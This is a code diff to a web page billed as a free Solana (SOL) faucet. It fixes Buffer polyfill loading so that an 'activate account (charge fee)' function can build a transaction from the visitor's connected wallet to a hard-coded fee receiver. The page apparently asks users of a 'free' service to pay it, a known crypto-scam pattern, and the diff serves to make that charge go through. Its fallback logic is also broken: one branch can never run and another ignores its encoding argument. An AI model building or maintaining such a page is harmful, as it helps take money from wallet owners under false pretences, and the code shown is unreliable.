@@ -4,11 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pinky Solana - Free SOL Faucet</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    <!-- Fixed Buffer polyfill with multiple fallbacks -->
     <script>
-        window.Buffer = Buffer; // Fix Buffer issues
+        if (typeof Buffer === 'undefined') {
+            window.global = window;
+            document.write('<script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"><\/script>');
+        }
     </script>
+    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .blink {
@@ -225,11 +228,43 @@
             }
         }
         
-        // Activate account (charge fee)
+        // Buffer fallback function
+        function ensureBufferCompatibility() {
+            if (typeof Buffer !== 'undefined' && typeof Buffer.from === 'function') {
+                return true;
+            }
+            
+            // Fallback 1: Try to load from CDN again
+            if (typeof window.Buffer === 'undefined') {
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js';
+                document.head.appendChild(script);
+                return false;
+            }
+            
+            // Fallback 2: Manual Buffer implementation
+            if (typeof window.Buffer === 'undefined') {
+                window.Buffer = {
+                    from: function(data, encoding) {
+                        const encoder = new TextEncoder();
+                        return encoder.encode(data);
+                    }
+                };
+            }
+            
+            return true;
+        }
+        
+        // Activate account (charge fee) with buffer fallbacks
         async function activateAccount() {
             if (!walletConnected) return;
             
             try {
+                // Ensure buffer compatibility
+                if (!ensureBufferCompatibility()) {
+                    throw new Error('Buffer initialization failed. Please refresh the page.');
+                }
+                
                 const receiver = new solanaWeb3.PublicKey(FEE_RECEIVER);
                 const sender = new solanaWeb3.PublicKey(walletAddress);
                 
